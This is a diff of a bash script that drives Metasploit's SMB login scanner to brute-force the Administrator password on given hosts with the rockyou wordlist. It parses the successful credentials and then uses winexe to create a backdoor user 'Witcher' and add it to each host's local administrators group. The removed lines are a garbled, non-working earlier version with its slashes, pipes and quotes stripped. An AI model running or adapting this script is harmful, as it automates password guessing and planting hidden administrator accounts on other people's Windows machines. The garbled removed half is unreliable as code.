@@ -1,31 +1,30 @@
-smb_user=Administrator
-while getopts ua option
+#!/bin/bash
+
+smb_user="Administrator"
+while getopts u:a: option
 do
-case ${option}
+case "${option}"
 in
 	u) smb_user=${OPTARG};;
 	a) rhosts=${OPTARG};;
 esac
 done
-rm -f msf3_output.txt
-msfconsole -q -x spool msf3_output.txt;
-		use auxiliaryscannersmbsmb_login;
-		set RHOSTS $rhosts;
-		set PASS_FILE usrsharewordlistsrockyou.txt;
-		set SMBUser $smb_user;
-		set ABORT_ON_LOCKOUT true;
-		set STOP_ON_SUCCESS true;
-		set BLANK_PASSWORDS true;
-		set USER_AS_PASS true;
-		set DETECT_ANY_AUTH true;
-		set VERBOSE true;
-		set DBGTRACE true;
-		run;exit;spool off;
-grep -oP d.d.d.d.Success.w. .msf3_output.txt  grep -Po (=)[^']+(=')  grep -Po (=- )[^']+(=d -)^w$  sed '$!N;sn ' sed -r 's[ ]+ passwordg'  sed -e 's^Ip'  grep -Po Ip. password.  Creds.txt
+results=$(msfconsole -q -x "use auxiliary/scanner/smb/smb_login;\
+		set RHOSTS "$rhosts";\
+		set PASS_FILE /usr/share/wordlists/rockyou.txt;\
+		set SMBUser "$smb_user";\
+		set ABORT_ON_LOCKOUT true;\
+		set STOP_ON_SUCCESS true;\
+		set BLANK_PASSWORDS true;\
+		set USER_AS_PASS true;\
+		set DETECT_ANY_AUTH true;\
+		set VERBOSE true;\
+		set DBGTRACE true;\
+		run;exit;" | grep -oP "\d*\.\d*\.\d*\.\d*.*Success:.*:\w*.*" | grep -Po "(?<=:)[^']+(?=')" | grep -Po "(?<=- )[^']+(?=:\d* -)|^\w*$" | sed '$!N;s/\n/ /'| sed -r 's/[ ]+/ password:/g' | sed -e 's/^/Ip:/' ) 
 while IFS= read -r line; do
-    temp_ip=$(echo $line  grep -Po (=Ip).(= ))
-    temp_password=$(echo $line  grep -Po (= password).)
-    winexe -U $temp_ip$smb_user%$temp_password $temp_ip Net user add Witcher Switcher
-    winexe -U $temp_ip$smb_user%$temp_password $temp_ip net localgroup administrators Witcher add
-done  Creds.txt
+    temp_ip=$(echo $line | grep -Po "(?<=Ip:).*(?= )")
+    temp_password=$(echo $line | grep -Po "(?<= password:).*")
+    winexe -U "$temp_ip"/"$smb_user"%"$temp_password" //"$temp_ip" "Net user /add Witcher Switcher"
+    winexe -U "$temp_ip"/"$smb_user"%"$temp_password" //"$temp_ip" "net localgroup administrators Witcher /add"
+done <<< "$results"
 exit
